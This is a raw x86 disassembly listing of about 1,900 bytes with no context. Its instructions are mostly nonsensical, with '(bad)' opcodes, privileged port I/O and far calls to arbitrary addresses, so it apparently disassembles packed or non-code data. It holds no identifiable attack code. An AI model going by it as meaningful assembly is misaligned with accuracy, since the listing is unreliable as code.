  41835d:	nop
  41835e:	sub    al,0xd3
  418360:	dec    ebx
  418362:	cmp    al,0x15
  418364:	pop    ecx
  418365:	xlat   BYTE PTR ds:[ebx]
  418366:	popa   
  418367:	adc    dl,al
  418369:	add    eax,0x41c23e4e
  41836e:	sbb    dh,BYTE PTR [ecx+0x0]
  418371:	mov    eax,0x4e2aa4e9
  418376:	jmp    DWORD PTR [ecx+ecx*2-0x5a]
  41837a:	ret    
  41837b:	and    dl,BYTE PTR [ebx+0x3da7f5dc]
  418381:	xchg   esp,eax
  418382:	pop    ss
  418383:	ins    BYTE PTR es:[edi],dx
  418384:	mov    bl,0x97
  418386:	sbb    eax,0x2e0fec04
  41838b:	mov    ebp,0x28276ec3
  418390:	cmp    al,0x5f
  418392:	ds inc esi
  418394:	in     eax,0x78
  418396:	cdq    
  418397:	jg     0x4183f6
  418399:	jmp    0xc4c2943c
  41839e:	das    
  41839f:	sbb    eax,DWORD PTR [eax+eiz*2+0x41db13a9]
  4183a6:	xlat   BYTE PTR ds:[ebx]
  4183a7:	lock leave 
  4183a9:	jl     0x418372
  4183ab:	sbb    ecx,DWORD PTR [ebp+0x34]
  4183ae:	add    al,0x92
  4183b0:	clc    
  4183b1:	ja     0x418418
  4183b3:	call   0x4903:0x31c3a89e
  4183ba:	rcr    DWORD PTR [ecx+eax*4+0x57ee4efe],1
  4183c1:	inc    ebx
  4183c3:	(bad)  
  4183c4:	fsubrp st(5),st
  4183c6:	(bad)  
  4183c7:	push   esp
  4183c8:	outs   dx,BYTE PTR ds:[esi]
  4183c9:	or     cl,BYTE PTR [esi+0x27e51421]
  4183cf:	mov    cl,0xa2
  4183d1:	mov    edi,0xdc4b58f6
  4183d6:	mov    eax,0xcb0725f5
  4183db:	aaa    
  4183dc:	clc    
  4183dd:	adc    ebp,DWORD PTR [ebx+edi*1+0x10ba82ec]
  4183e4:	repz cmp edx,edi
  4183e7:	add    dh,BYTE PTR [edx]
  4183e9:	mov    ebx,eax
  4183eb:	cmp    bh,bh
  4183ed:	and    al,0x68
  4183ef:	ret    0xa0e4
  4183f2:	sub    DWORD PTR [edi+eiz*4],esp
  4183f5:	add    eax,ebx
  4183f7:	out    dx,eax
  4183f8:	dec    ecx
  4183f9:	xchg   BYTE PTR [eax+0x80905e5],bl
  4183ff:	dec    ebx
  418400:	inc    ecx
  418401:	jl     0x418479
  418403:	inc    ebx
  418404:	add    al,0x94
  418406:	js     0x418393
  418408:	push   edx
  418409:	or     al,0x93
  41840b:	ins    DWORD PTR es:[edi],dx
  41840c:	jg     0x41844d
  41840e:	sub    eax,0x43637c7b
  418413:	xor    BYTE PTR [edi],cl
  418415:	inc    esi
  418416:	stc    
  418417:	sar    BYTE PTR [edi+ecx*4-0x5c],0x18
  41841c:	sbb    edi,DWORD PTR [esi-0x1a]
  41841f:	add    ch,BYTE PTR [edi]
  418421:	div    BYTE PTR ds:0xd195f33
  418427:	or     esi,DWORD PTR [ebx]
  418429:	cwde   
  41842a:	mov    eax,0x3cd7048a
  41842f:	push   es
  418430:	sub    ebx,DWORD PTR [ecx-0x4430a7a5]
  418436:	arpl   WORD PTR [edi],bx
  418438:	into   
  418439:	fcom   QWORD PTR [eax+ebp*8]
  41843c:	call   0xe585fabd
  418441:	in     al,dx
  418442:	push   ecx
  418443:	ins    BYTE PTR es:[edi],dx
  418444:	xchg   esi,eax
  418445:	xor    al,0x7b
  418447:	xchg   esi,eax
  418448:	dec    esp
  418449:	shl    BYTE PTR [esi],cl
  41844b:	fisub  WORD PTR [edi]
  41844d:	sub    ah,BYTE PTR [eax]
  41844f:	retf   0xd1bb
  418452:	push   edi
  418453:	push   ecx
  418454:	test   DWORD PTR [edx+ebx*1+0x48],0x4896f15c
  41845c:	fld    DWORD PTR [eax]
  41845e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41845f:	into   
  418460:	inc    ecx
  418461:	jle    0x4184b2
  418463:	inc    esi
  418464:	xor    al,0x94
  418466:	inc    ecx
  418467:	jp     0x418488
  418469:	xchg   edi,eax
  41846a:	xchg   ebx,eax
  41846b:	fild   DWORD PTR [esi]
  41846d:	loopne 0x41848c
  41846f:	ds pop edi
  418471:	fcom   QWORD PTR [esi-0x31]
  418474:	add    BYTE PTR [ebp-0x4a],al
  418477:	mov    eax,0xbffd083c
  41847c:	call   0x68f1:0x49ebf694
  418483:	lods   eax,DWORD PTR ds:[esi]
  418484:	mov    edx,0x18698b46
  418489:	ja     0x418443
  41848b:	fs shl dx,0xf4
  418490:	sub    bh,BYTE PTR [ecx]
  418492:	push   ebx
  418493:	jnp    0x418468
  418495:	pop    ss
  418496:	jl     0x418465
  418498:	(bad)  
  418499:	or     DWORD PTR [esi+0x7c],edx
  41849c:	cs in  al,dx
  41849e:	mov    eax,0x86b06957
  4184a3:	jnp    0x418506
  4184a5:	lea    ecx,gs:[eax+eiz*2-0x61]
  4184aa:	bound  ecx,QWORD PTR [edi-0x2c8852e9]
  4184b0:	aad    0xcb
  4184b2:	in     al,0x69
  4184b4:	or     esi,DWORD PTR [ebp+ebx*4+0x3074f8e4]
  4184bb:	xchg   ecx,eax
  4184bc:	fs jecxz 0x418483
  4184bf:	cli    
  4184c0:	mov    edx,ds
  4184c2:	mov    ebx,0xfa7396f2
  4184c7:	sbb    bh,ah
  4184c9:	push   0x132a065e
  4184ce:	int3   
  4184cf:	sti    
  4184d0:	ss push edi
  4184d2:	sbb    BYTE PTR [ecx-0x1a5374b8],dl
  4184d8:	in     al,dx
  4184d9:	fucomp st(1)
  4184db:	mov    esp,0x9783f7b3
  4184e0:	cld    
  4184e1:	xor    esp,DWORD PTR [ebx-0x6c4f8371]
  4184e7:	dec    ebx
  4184e8:	scas   eax,DWORD PTR es:[edi]
  4184e9:	or     eax,0xde1421fd
  4184ee:	imul   edx,DWORD PTR [esp+esi*8],0xfffffffa
  4184f2:	fistp  DWORD PTR [edi+eiz*2+0x10]
  4184f6:	retf   0x9817
  4184f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184fa:	or     eax,0x7023d2a3
  4184ff:	dec    edx
  418500:	xchg   ebp,eax
  418502:	ror    BYTE PTR [edx+ebp*1-0x3c],cl
  418506:	int    0x75
  418508:	pop    esp
  418509:	push   cs
  41850a:	call   0x40461190
  41850f:	jbe    0x41850a
  418511:	shl    bl,1
  418513:	imul   ebp,DWORD PTR [ebx+eiz*4-0x3acdce77],0x3b
  41851b:	jg     0x4184d2
  41851d:	sub    eax,0xa48086fe
  418522:	in     al,0x7f
  418524:	rcr    DWORD PTR [edi],0xf6
  418527:	sub    eax,0x8180e51f
  41852c:	xor    al,0x95
  41852f:	retf   0x4754
  418532:	or     al,0x59
  418534:	je     0x41850d
  418536:	push   esp
  418537:	in     eax,dx
  418538:	or     BYTE PTR [edx+0x5d],cl
  41853b:	cmp    al,BYTE PTR [esi-0x23508ae0]
  418541:	and    BYTE PTR [edi-0x3b824c56],0x15
  418548:	or     eax,0x78b19773
  41854d:	mov    ah,0xb2
  41854f:	xchg   esp,eax
  418550:	scas   eax,DWORD PTR es:[edi]
  418551:	adc    al,0x34
  418553:	cmp    BYTE PTR [eax-0x49e63ebb],ch
  418559:	loop   0x41850e
  41855b:	std    
  41855c:	mov    ds:0x15272928,al
  418561:	jl     0x418573
  418563:	mov    eax,ds:0xdb2d3f49
  418568:	pop    es
  418569:	jb     0x4184f5
  41856b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41856c:	adc    ch,BYTE PTR [ebp+0x29fa1bbc]
  418572:	das    
  418573:	imul   esi,ebp,0xffffffab
  418576:	std    
  418577:	dec    eax
  418578:	xchg   edi,eax
  418579:	dec    edi
  41857a:	xor    dh,BYTE PTR [ecx-0x18b29664]
  418580:	jl     0x418553
  418582:	mov    bl,0x60
  418584:	(bad)  
  418585:	fadd   QWORD PTR [esi-0x274a8019]
  41858b:	xor    BYTE PTR [ebp-0x4a73dc5c],cl
  418591:	outs   dx,DWORD PTR ds:[esi]
  418592:	js     0x418562
  418594:	sar    BYTE PTR [ebx+0x9],cl
  418597:	pop    edx
  418598:	out    0xb5,al
  41859a:	and    eax,0xdf7ffa46
  41859f:	js     0x41861a
  4185a1:	xchg   esp,eax
  4185a2:	iret   
  4185a3:	pop    esi
  4185a4:	ins    BYTE PTR es:[edi],dx
  4185a5:	mov    ds:0xef3bc0c6,eax
  4185aa:	cmc    
  4185ab:	cld    
  4185ac:	mov    ebp,DWORD PTR [ecx]
  4185ae:	mov    al,cl
  4185b0:	cld    
  4185b1:	sbb    edx,ebx
  4185b3:	sub    ecx,esp
  4185b5:	cmp    BYTE PTR [ebx-0x4689ccf3],al
  4185bb:	jle    0x4185b5
  4185bd:	cmp    BYTE PTR [edx-0x53],cl
  4185c0:	pop    eax
  4185c1:	into   
  4185c2:	mov    DWORD PTR [edi],ebp
  4185c4:	mov    bl,0x7d
  4185c6:	jge    0x41863d
  4185c8:	es dec eax
  4185ca:	xchg   edx,eax
  4185cb:	push   ecx
  4185cc:	xchg   ebx,eax
  4185cd:	pop    edx
  4185ce:	lds    esi,FWORD PTR [eax-0x4787b9fb]
  4185d4:	cmp    al,0xec
  4185d6:	ins    BYTE PTR es:[edi],dx
  4185d7:	loop   0x41855b
  4185d9:	jl     0x41864b
  4185db:	adc    eax,0xb39753e9
  4185e0:	push   ebp
  4185e1:	je     0x418600
  4185e3:	lock mul bh
  4185e6:	fcmovnbe st,st(4)
  4185e8:	pop    edi
  4185e9:	fbstp  TBYTE PTR ds:[eax+0x4925bb88]
  4185f0:	inc    ebx
  4185f1:	sub    eax,0x7de9c818
  4185f6:	cld    
  4185f7:	mov    al,ds:0x6b3d4803
  4185fc:	xor    esp,edi
  4185fe:	cmp    DWORD PTR [ecx-0xb],edi
  418601:	push   eax
  418602:	scas   al,BYTE PTR es:[edi]
  418603:	out    0x95,al
  418605:	and    al,0xa7
  418607:	jmp    0xf85b:0x1d488c04
  41860e:	lods   eax,DWORD PTR ds:[esi]
  41860f:	inc    edx
  418610:	inc    ecx
  418611:	jmp    0xdf29:0x101de4c2
  418618:	(bad)  
  418619:	sbb    eax,0x92687abf
  41861e:	sbb    al,0x34
  418620:	sahf   
  418621:	mov    dh,0xe2
  418623:	fnstcw WORD PTR gs:[esi]
  418626:	(bad)  
  418627:	imul   ebp,ebp,0x37
  41862a:	setne  bh
  41862d:	pop    ss
  41862e:	bswap  ecx
  418630:	(bad)  
  418631:	fdiv   QWORD PTR [ecx]
  418633:	xchg   bl,bh
  418635:	retf   
  418636:	xor    eax,0x3e59d567
  41863b:	xor    al,0x44
  41863d:	test   esi,eax
  41863f:	push   es
  418640:	adc    al,0x66
  418642:	xor    eax,0x7ea5f4d2
  418647:	xor    edx,DWORD PTR [ebx-0xf79f73f]
  41864d:	mov    DWORD PTR [eax+0x498778b9],ecx
  418653:	repnz dec eax
  418655:	add    bl,0x20
  418658:	icebp  
  418659:	or     al,BYTE PTR [eax]
  41865b:	push   edx
  41865c:	cmp    bl,BYTE PTR cs:[eax-0x1d1945b0]
  418663:	cs pop es
  418665:	cld    
  418666:	or     ch,BYTE PTR [eax+eiz*4]
  418669:	out    0x92,eax
  41866b:	mul    BYTE PTR [esi-0x4e]
  41866e:	das    
  41866f:	es push ebx
  418671:	(bad)  
  418672:	push   ecx
  418673:	shr    cl,cl
  418675:	outs   dx,BYTE PTR ds:[esi]
  418676:	retf   0xc1c5
  418679:	mov    DWORD PTR [eax-0x80],0xbcee9372
  418680:	pop    eax
  418681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418682:	xchg   eax,eax
  418684:	repz shr DWORD PTR [ecx*8+0x7e113d6b],0xad
  41868d:	sahf   
  41868e:	jl     0x4186c9
  418690:	in     eax,0x80
  418692:	and    DWORD PTR [ebx],edi
  418694:	dec    esi
  418695:	sub    eax,0x4d8ca162
  41869a:	inc    esi
  41869b:	nop
  41869c:	sub    eax,0x9fd2c8c1
  4186a1:	add    eax,0x144490db
  4186a6:	test   BYTE PTR [esi-0x674e2ee1],cl
  4186ac:	int3   
  4186ad:	push   ss
  4186ae:	shl    DWORD PTR [esi+0x4e069bca],1
  4186b4:	xchg   ecx,eax
  4186b5:	push   0x89027d3d
  4186ba:	mov    bh,BYTE PTR [esi+ebp*8]
  4186bd:	mov    ds:0x53916e3b,eax
  4186c2:	mov    DWORD PTR [eax-0x16],edi
  4186c5:	push   ss
  4186c6:	imul   ebx,ebp,0x24cc8707
  4186cc:	lea    ebx,[edi+0x2ea77b82]
  4186d2:	in     eax,dx
  4186d3:	dec    ecx
  4186d4:	fst    DWORD PTR [esi+0x40]
  4186d7:	inc    esi
  4186d8:	cmc    
  4186d9:	xchg   edi,eax
  4186da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186db:	mov    ds:0x4b4ccbc9,eax
  4186e0:	idiv   BYTE PTR gs:[eax-0x31]
  4186e4:	dec    ecx
  4186e5:	xchg   ebx,eax
  4186e6:	repnz sub DWORD PTR [edi],eax
  4186e9:	retf   
  4186ea:	and    ah,BYTE PTR [edi-0x6a296fb4]
  4186f0:	lods   eax,DWORD PTR ds:[esi]
  4186f1:	fsubr  st,st(0)
  4186f3:	(bad)  
  4186f4:	ja     0x4186bc
  4186f6:	imul   esp,ebp,0xffffffec
  4186f9:	mov    dh,0xdf
  4186fb:	jne    0x4186d0
  4186fd:	jns    0x4186e8
  4186ff:	mov    cl,0x29
  418701:	pushf  
  418702:	xor    eax,0xbbcc1176
  418707:	push   ebp
  418708:	stc    
  418709:	hlt    
  41870a:	es in  eax,0xfb
  41870d:	int    0xd
  41870f:	pop    esp
  418710:	push   ebp
  418711:	or     eax,0xb85cb146
  418716:	adc    al,0xee
  418718:	loop   0x418724
  41871a:	mov    cl,0x3a
  41871c:	lds    ecx,FWORD PTR [esi]
  41871e:	jnp    0x4186ed
  418720:	enter  0x8680,0x1
  418724:	ins    BYTE PTR es:[edi],dx
  418725:	popf   
  418726:	xor    eax,0xae045aea
  41872b:	(bad)  
  41872c:	ror    ebp,0xaa
  41872f:	cmc    
  418730:	xor    eax,0x205b92ae
  418735:	mov    edx,edx
  418737:	add    eax,0xa9b50bc7
  41873c:	push   esp
  41873d:	and    al,BYTE PTR [eax]
  41873f:	xor    DWORD PTR [ebp-0x5d],esi
  418742:	shl    DWORD PTR [ecx-0x41],1
  418745:	add    al,BYTE PTR [eax-0x3ab6c63e]
  41874b:	inc    edi
  41874c:	popf   
  41874d:	das    
  41874e:	xchg   DWORD PTR [edi],eax
  418750:	push   edx
  418751:	mov    edx,0xeff2d120
  418756:	add    DWORD PTR [edi-0x7b05c1e0],ebp
  41875c:	xor    esi,DWORD PTR [eax-0x7a41c328]
  418762:	test   BYTE PTR [esi],bl
  418764:	dec    edx
  418765:	xchg   esp,eax
  418766:	mov    BYTE PTR [ebx+0x2f],bh
  418769:	mov    bl,BYTE PTR [ebp-0x7b]
  41876c:	in     eax,0x55
  41876e:	sbb    dl,dl
  418770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418771:	adc    BYTE PTR [eax+0x77f871ba],0x14
  418778:	xchg   edi,eax
  418779:	xchg   edx,eax
  41877a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41877b:	dec    ebx
  41877c:	inc    eax
  41877d:	xlat   BYTE PTR ds:[ebx]
  41877e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41877f:	lock repz cmc 
  418782:	iret   
  418783:	push   cs
  418784:	inc    ebp
  418785:	and    BYTE PTR [ebx-0x4f],bl
  418788:	mov    ch,0x2d
  41878a:	sbb    BYTE PTR [esi+eiz*1-0x42],0xd7
  41878f:	inc    esp
  418790:	retf   0xfaa0
  418793:	lahf   
  418794:	shr    BYTE PTR [edx],1
  418796:	xchg   cl,dl
  418798:	pop    edi
  418799:	mov    esi,0x51cb162
  41879e:	pop    es
  41879f:	rcl    BYTE PTR [edi+0x46779bfc],0x51
  4187a6:	out    dx,al
  4187a7:	ds dec edx
  4187aa:	xor    al,0x6e
  4187ac:	sub    BYTE PTR [ebp-0x7197f8d7],al
  4187b2:	fchs   
  4187b4:	call   0x8078:0x2a961932
  4187bb:	sub    al,0xfb
  4187bd:	mov    ch,0x14
  4187bf:	jbe    0x41874a
  4187c1:	xor    eax,0x37a1dd16
  4187c6:	(bad)  
  4187c7:	(bad)  
  4187c8:	popa   
  4187c9:	or     bh,BYTE PTR [esi+0x40]
  4187cc:	xchg   BYTE PTR [edi+0x460b3bc8],bh
  4187d2:	dec    esp
  4187d3:	xchg   DWORD PTR [eax-0x1d],ebx
  4187d6:	or     eax,0x3f276cd4
  4187db:	test   al,0x52
  4187dd:	cmp    eax,0xbda4b94b
  4187e2:	mov    al,0xfa
  4187e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187e5:	dec    sp
  4187e7:	ss xchg esp,eax
  4187e9:	jb     0x4187a6
  4187eb:	cmp    al,0xeb
  4187ed:	jmp    DWORD PTR [edx-0x6b8db4ce]
  4187f3:	in     eax,0x60
  4187f5:	dec    ebx
  4187f6:	enter  0x1659,0x85
  4187fa:	test   BYTE PTR [ecx-0x72],al
  4187fd:	dec    ecx
  4187fe:	cdq    
  4187ff:	out    0x70,eax
  418801:	leave  
  418802:	jp     0x418845
  418804:	sub    al,BYTE PTR [ecx+edi*4-0x52]
  418808:	or     edi,esp
  41880a:	cmp    edx,DWORD PTR [edi-0x2ec670dd]
  418810:	pop    ebp
  418811:	sub    BYTE PTR [ecx+0x51],dl
  418814:	test   BYTE PTR [ebx+ecx*2],bl
  418817:	es push edx
  418819:	push   ebp
  41881a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41881b:	inc    ebx
  41881c:	mov    eax,ebp
  41881e:	adc    eax,0xa31909d1
  418823:	mov    cl,BYTE PTR ds:0xc7328e24
  418829:	aaa    
  41882a:	not    BYTE PTR [edi+0x4a]
  41882d:	fdiv   QWORD PTR [ecx+edx*2-0x77]
  418831:	lds    ebx,FWORD PTR [ecx+0x47]
  418834:	dec    ebx
  418835:	out    0x3d,eax
  418837:	jnp    0x418844
  418839:	imul   esi,DWORD PTR [edi],0x17
  41883c:	add    BYTE PTR [eax-0x68a44a55],bl
  418842:	sbb    bl,BYTE PTR [eax-0x54cf86fa]
  418848:	jle    0x418814
  41884a:	mov    edi,DWORD PTR [edi]
  41884c:	aaa    
  41884d:	mov    bl,0x3
  41884f:	mov    eax,0x4457aa1
  418854:	mov    edx,0xc644c792
  418859:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41885a:	test   eax,0x80aa32cc
  41885f:	test   DWORD PTR [ebp-0x1d],edi
  418862:	int3   
  418863:	push   ebx
  418864:	or     al,0x68
  418866:	jae    0x4188c4
  418868:	xchg   ebp,eax
  418869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41886a:	push   edx
  41886b:	out    dx,eax
  41886c:	retf   0x271b
  41886f:	loope  0x4188a8
  418871:	pop    es
  418872:	mov    ds:0x4edb185d,eax
  418877:	aaa    
  418878:	cmp    edi,DWORD PTR [ebp+0x2f]
  41887b:	test   eax,0xd2dc869b
  418880:	dec    ebx
  418881:	jecxz  0x418899
  418883:	push   edx
  418884:	out    0xdb,eax
  418886:	pop    eax
  418887:	loope  0x4188a6
  418889:	retf   0x93c4
  41888c:	cmc    
  41888d:	ret    0x7651
  418890:	dec    eax
  418891:	or     bl,BYTE PTR [esi+0x29a9557c]
  418897:	imul   ecx
  418899:	sub    dh,BYTE PTR [edi+0x6]
  41889c:	scas   eax,DWORD PTR es:[edi]
  41889d:	(bad)  
  41889e:	lahf   
  41889f:	lods   eax,DWORD PTR ds:[esi]
  4188a0:	xchg   edx,eax
  4188a1:	outs   dx,BYTE PTR ds:[esi]
  4188a2:	adc    edx,DWORD PTR [ebp+0x4e6f8b1a]
  4188a8:	int3   
  4188a9:	mov    ebx,0x834733ae
  4188ae:	or     eax,0x49d9869a
  4188b3:	jge    0x41891f
  4188b5:	fidivr DWORD PTR ds:0x4189d17
  4188bb:	mov    al,0x3a
  4188bd:	mov    bl,0xc8
  4188bf:	(bad)  
  4188c1:	call   0xb7ab:0x7100e2a9
  4188c8:	push   ecx
  4188c9:	push   edi
  4188ca:	aad    0x3b
  4188cc:	push   eax
  4188cd:	pop    edi
  4188ce:	rol    BYTE PTR [esi],0xa7
  4188d1:	add    BYTE PTR [ecx+ebp*4-0x50],dl
  4188d5:	mov    dh,0x8b
  4188d7:	into   
  4188d8:	lds    ebp,FWORD PTR [edi]
  4188da:	pop    ss
  4188db:	xchg   DWORD PTR [ebx],ebp
  4188dd:	dec    ebp
  4188de:	mov    ecx,DWORD PTR [ecx+0x712d7161]
  4188e4:	and    BYTE PTR [ecx],bl
  4188e6:	pop    ebp
  4188e7:	adc    al,0xf
  4188e9:	push   ebx
  4188ea:	add    eax,0xe23cfbc9
  4188ef:	cld    
  4188f0:	or     eax,0xc4cc5da9
  4188f5:	jb     0x418877
  4188f7:	mov    dh,0xb8
  4188f9:	jg     0x41895c
  4188fb:	jl     0x41888f
  4188fd:	sti    
  4188fe:	inc    ebx
  4188ff:	mov    ds:0x5223ca74,eax
  418904:	jl     0x4188f2
  418906:	mov    esi,0x7f4b2285
  41890b:	ss cs inc eax
  41890e:	scas   al,BYTE PTR es:[edi]
  41890f:	js     0x4188fd
  418911:	pop    edi
  418912:	rcr    DWORD PTR [edx-0x58],1
  418915:	jmp    0x41897c
  418917:	mov    esi,DWORD PTR [ebx+0x4c]
  41891a:	clc    
  41891b:	fild   QWORD PTR [esp+eax*2-0x27]
  41891f:	inc    ecx
  418920:	(bad)  [edx]
  418922:	fnstcw WORD PTR [edi+eiz*8]
  418925:	push   ecx
  418926:	ins    BYTE PTR es:[edi],dx
  418927:	or     cl,ch
  418929:	and    eax,0x97c0c7f3
  41892e:	mov    ebp,DWORD PTR [ebx-0x5]
  418931:	shr    WORD PTR [ecx-0x2f],0xed
  418936:	aaa    
  418937:	test   DWORD PTR [ebp-0x26e8ce54],esi
  41893d:	dec    edi
  41893e:	popf   
  41893f:	push   eax
  418940:	cmp    esi,DWORD PTR [esi-0x74]
  418943:	dec    esp
  418944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418945:	outs   dx,DWORD PTR ds:[esi]
  418946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418947:	pop    esi
  418948:	into   
  418949:	adc    DWORD PTR [ebx],esi
  41894b:	test   eax,0x583f2362
  418950:	(bad)  
  418951:	neg    cl
  418953:	sbb    DWORD PTR [ebx+eax*4-0x62],esi
  418957:	ss aad 0xd5
  41895a:	xor    eax,DWORD PTR [ecx+0x49]
  41895d:	sbb    dl,BYTE PTR [edx+0x1af4e4e7]
  418963:	outs   dx,DWORD PTR ds:[esi]
  418964:	mov    DWORD PTR [ebp-0x58],edx
  418967:	mov    esi,0xe55b040c
  41896c:	xor    ebp,DWORD PTR [eax-0x16]
  41896f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418971:	lea    esi,[edi-0x6c]
  418974:	jnp    0x4189a5
  418976:	mov    esp,0x1d2b2afd
  41897b:	fisubr WORD PTR [eax+0x58]
  41897e:	jnp    0x418950
  418980:	xchg   edi,eax
  418981:	dec    esp
  418982:	dec    ecx
  418983:	int3   
  418984:	sub    edi,ebx
  418986:	das    
  418987:	jne    0x4189c2
  418989:	ja     0x418961
  41898b:	and    eax,0x1894e327
  418990:	push   0x25
  418992:	adc    esp,DWORD PTR [ecx+0xd8105a]
  418998:	xchg   DWORD PTR [esi],ebp
  41899a:	sbb    BYTE PTR [esi],ch
  41899c:	add    ah,bl
  41899e:	cld    
  41899f:	xchg   edx,eax
  4189a0:	cmp    al,0x27
  4189a2:	shl    DWORD PTR [edx+ebx*4],0x98
  4189a6:	test   al,0x22
  4189a8:	lock mov BYTE PTR [ebx+0x63325c85],ch
  4189af:	int3   
  4189b0:	sub    ebp,DWORD PTR [ebx-0xd]
  4189b3:	jae    0x41899a
  4189b5:	sbb    al,0x3a
  4189b7:	push   eax
  4189b8:	test   DWORD PTR [ebp+0x7033862b],eax
  4189be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189bf:	mov    bh,0xf7
  4189c1:	dec    ebx
  4189c2:	in     ax,0x13
  4189c5:	mov    edi,0xbae8fef9
  4189ca:	and    ecx,DWORD PTR [ebx-0x7]
  4189cd:	stos   DWORD PTR es:[edi],eax
  4189ce:	outs   dx,DWORD PTR ds:[esi]
  4189cf:	rcr    cl,0xcd
  4189d2:	sti    
  4189d3:	cmp    al,cl
  4189d5:	xchg   esi,eax
  4189d6:	scas   al,BYTE PTR es:[edi]
  4189d7:	ins    DWORD PTR es:[edi],dx
  4189d8:	js     0x4189db
  4189da:	imul   ebx,ebx,0xffffffd5
  4189dd:	loopne 0x4189e9
  4189df:	out    dx,eax
  4189e0:	dec    ecx
  4189e1:	cmp    eax,DWORD PTR [esi+ebp*8-0x2e]
  4189e5:	push   esp
  4189e6:	dec    ecx
  4189e7:	out    dx,eax
  4189e8:	jmp    0x4189c7
  4189ea:	push   cs
  4189eb:	dec    edx
  4189ec:	sub    DWORD PTR [ecx],ebx
  4189ee:	adc    BYTE PTR [ecx-0x56691a30],bl
  4189f4:	sbb    eax,ebx
  4189f6:	mov    cl,BYTE PTR [ebx]
  4189f8:	push   eax
  4189f9:	sar    BYTE PTR [edi],1
  4189fb:	adc    eax,0xe207ad80
  418a00:	xchg   esi,eax
  418a01:	ja     0x418a3a
  418a03:	pop    es
  418a04:	gs (bad) 
  418a06:	mov    al,0x7e
  418a08:	jae    0x418a15
  418a0a:	mov    al,BYTE PTR [ecx]
  418a0c:	jge    0x418a10
  418a0e:	outs   dx,BYTE PTR ds:[esi]
  418a0f:	pop    ecx
  418a10:	xchg   ebp,eax
  418a11:	push   esi
  418a12:	call   0x9c15:0x954f38c
  418a19:	add    DWORD PTR [edi+0x315feee1],ecx
  418a1f:	cmp    ebp,ebp
  418a21:	adc    eax,edi
  418a23:	pop    ebx
  418a24:	add    eax,0x2a8d86f
  418a29:	scas   eax,DWORD PTR es:[edi]
  418a2a:	out    dx,al
  418a2b:	xor    eax,0x2a3a8c1a
  418a30:	jae    0x418a01
  418a32:	push   es
  418a33:	push   es
  418a34:	or     esi,esi
  418a36:	mov    bh,0xc2
  418a38:	mov    cl,0xf6
  418a3a:	pop    ebx
  418a3b:	xor    BYTE PTR [edi-0x5550ea15],ch
  418a41:	aad    0xb9
  418a43:	add    eax,0xc9c341ad
  418a48:	mov    bh,0x9
  418a4a:	xchg   ecx,eax
  418a4b:	in     al,0x37
  418a4d:	lahf   
  418a4e:	call   0x1d90a1ae
  418a53:	fidivr DWORD PTR [ebx-0x61815a79]
  418a59:	repz push edx
  418a5b:	lods   al,BYTE PTR ds:[esi]
  418a5c:	jb     0x418a16
  418a5e:	mov    dl,0xb9
  418a60:	(bad)  
  418a61:	mov    ch,BYTE PTR ds:0xcfa18cf9
  418a67:	add    DWORD PTR [edi+0x22],0xffffffa9
  418a6b:	retf   
  418a6c:	popa   
  418a6d:	call   0xf65ec96f
  418a72:	hlt    
  418a73:	sbb    edx,ebx
  418a75:	sub    edi,DWORD PTR [ecx]
  418a77:	jge    0x418a35
  418a79:	mov    esi,DWORD PTR [eax+edx*8+0x5aeae77e]
  418a80:	mov    dl,0x92
  418a82:	adc    BYTE PTR [ebx+0x57],0xfd
  418a86:	frstor [edi-0x79]
  418a89:	outs   dx,BYTE PTR ds:[esi]
  418a8a:	fs cld 
  418a8c:	in     eax,0x12
  418a8e:	(bad)  
  418a8f:	xchg   edi,eax
  418a90:	mov    edi,0xefa6a0ff
  418a95:	add    eax,0x68274f
  418a9a:	cld    
  418a9b:	mov    edi,0x7695c83a
  418aa0:	call   0x6adf:0xab9fae83
  418aa7:	jns    0x418a6c
  418aa9:	pusha  
  418aaa:	inc    ebp
  418aab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418aac:	mov    BYTE PTR [bp+si],0xd8
  418ab0:	push   ss
  418ab1:	ss jb  0x418a3c
  418ab4:	ins    DWORD PTR es:[edi],dx
  418ab5:	ss xor edx,esi
  418ab8:	mov    edi,0xeefe44e9
  418abd:	sar    BYTE PTR [edi+0x14],0xa9
  418ac1:	jae    0x418ab0
  418ac3:	xchg   esi,eax
  418ac4:	mov    ebp,0x1430d607
  418ac9:	xchg   BYTE PTR [ebx],dl
  418acb:	test   eax,0x26778530
  418ad0:	pop    ecx
  418ad1:	push   edi
  418ad2:	mov    esp,0x878b1bcc
  418ad7:	shl    edi,0x66
  418ada:	jecxz  0x418ac8
  418adc:	pop    ebp
  418add:	out    dx,eax
  418ade:	and    al,0xe9
  418ae0:	push   0xffffff99
  418ae2:	mov    ebp,0x5e56c8ba
  418ae7:	mov    ecx,0xc07bda33
  418aec:	mov    ss,ebp
  418aee:	mov    eax,0xe3108301
  418af3:	sti    
  418af4:	cmc    
  418af5:	out    0xd6,eax
  418af7:	ja     0x418a81
  418af9:	push   esp
  418afa:	push   edi
  418afb:	hlt    
  418afc:	inc    ecx
  418afd:	in     al,dx
  418afe:	inc    edi
  418aff:	(bad)  
  418b00:	dec    eax
  418b01:	cmp    BYTE PTR ds:0x45766325,bl
  418b07:	ja     0x418b68
  418b09:	push   esp
  418b0a:	neg    dh
  418b0c:	xor    DWORD PTR [ebx-0x614c9ee4],edi
  418b12:	or     BYTE PTR [eax+ebx*8],ah
  418b15:	jle    0x418ade
  418b17:	cmp    eax,0xfecfe920
  418b1c:	or     al,0x41
  418b1e:	dec    esp
  418b1f:	adc    eax,0x1f3d3f7d
  418b24:	pop    esi
